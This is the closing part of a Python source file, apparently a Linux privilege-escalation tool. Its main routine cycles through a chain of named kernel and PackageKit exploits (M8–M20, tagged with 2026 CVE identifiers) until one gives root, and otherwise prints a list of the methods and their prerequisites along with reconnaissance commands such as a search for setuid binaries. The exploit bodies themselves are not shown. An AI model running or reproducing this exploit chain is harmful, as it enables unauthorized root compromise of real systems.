    except SystemExit:
        raise
    except Exception as e:
        log("[-] M8 error: %s: %s" % (type(e).__name__, e))

    # M9: CVE-2026-31694 (FUSE readdir page-cache overflow)
    try:
        if try_cve_2026_31694():
            return
    except SystemExit:
        raise
    except Exception as e:
        log("[-] M9 error: %s: %s" % (type(e).__name__, e))

    # M10: Fragnesia (ESP-in-TCP page cache write)
    try:
        if try_fragnesia():
            return
    except SystemExit:
        raise
    except Exception as e:
        log("[-] M10 error: %s: %s" % (type(e).__name__, e))

    # M11: CVE-2026-31635 (DirtyDecrypt — RxGK pagecache write)
    try:
        if try_dirtydecrypt():
            return
    except SystemExit:
        raise
    except Exception as e:
        log("[-] M11 error: %s: %s" % (type(e).__name__, e))

    # M12: CVE-2026-46243 (CIFSwitch — cifs.upcall + NSS confusion)
    try:
        if try_cve_2026_46243():
            return
    except SystemExit:
        raise
    except Exception as e:
        log("[-] M12 error: %s: %s" % (type(e).__name__, e))

    # M13: CVE-2026-64531 (OVSWrap — OVS arbitrary R/W)
    try:
        if try_cve_2026_64531():
            return
    except SystemExit:
        raise
    except Exception as e:
        log("[-] M13 error: %s: %s" % (type(e).__name__, e))

    # M14: CVE-2026-80844 (DirtyAH6 — IPv6 AH/ESP page cache)
    try:
        if try_cve_2026_80844():
            return
    except SystemExit:
        raise
    except Exception as e:
        log("[-] M14 error: %s: %s" % (type(e).__name__, e))

    # M15: CVE-2026-81000 (TUNderflow — TUN/OVS/netkit race)
    try:
        if try_cve_2026_81000():
            return
    except SystemExit:
        raise
    except Exception as e:
        log("[-] M15 error: %s: %s" % (type(e).__name__, e))

    # M20: Pack2TheRoot
    try:
        if try_pack2root():
            return
    except SystemExit:
        raise
    except Exception as e:
        log("[-] M20 error: %s: %s" % (type(e).__name__, e))

    # Diagnostics
    log("\n" + "=" * 55)
    log("[!] All methods failed")
    log("=" * 55)
    log("\n  M1/M2 CopyFail: AF_ALG authencesn + splice, kernel 4.14-6.19.12")
    log("  M3 DirtyCBC: AF_RXRPC + libcrypto, RxGK token-decrypt page-cache OOB-W")
    log("  M4 DirtyFrag: ESP/RxRPC C chain, needs gcc + user namespaces")
    log("  M5 DirtyClone: CVE-2026-43503, ESP xfrm ESN, needs gcc + user namespaces")
    log("  M6 RefluXFS: XFS reflink race, needs gcc + XFS w/ reflink=1")
    log("  M7 Bad Epoll: epoll UAF + AAW + ROP, kernel 6.4-7.1-rc, needs gcc")
    log("  M20 Pack2TheRoot: PackageKit <= 1.3.4, system D-Bus")
    log("\n  Check:")
    log("    cat /proc/crypto | grep authencesn")
    log("    cat /proc/modules | grep rxrpc")
    log("    cat /proc/sys/user/max_user_namespaces")
    log("    find / -perm -4000 -type f 2>/dev/null")
    sys.exit(1)
    

if __name__ == "__main__":
    main()